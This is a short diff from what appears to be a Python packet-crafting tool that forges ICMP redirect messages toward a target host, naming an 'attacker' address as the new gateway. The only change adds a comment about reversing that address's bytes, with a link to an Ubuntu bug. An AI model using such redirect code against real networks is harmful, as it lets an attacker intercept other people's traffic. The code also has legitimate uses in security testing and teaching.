@@ -44,7 +44,7 @@ ip.dst = args.target
 icmp      = ICMP()
 icmp.type = 5
 icmp.code = args.redirect_code  
-icmp.gw   = '.'.join(args.attacker.split('.')[::-1])
+icmp.gw   = '.'.join(args.attacker.split('.')[::-1]) #Noticed that ping was resolving using an INARPA address so reversed the bytes and it worked O_o UPDATE: https://bugs.launchpad.net/ubuntu/+source/iputils/+bug/1892108 affects Ubuntu20.04
 
 #internet header payload, this can be sniffed instead of manually created for better results against modern OS.
 if args.iface:
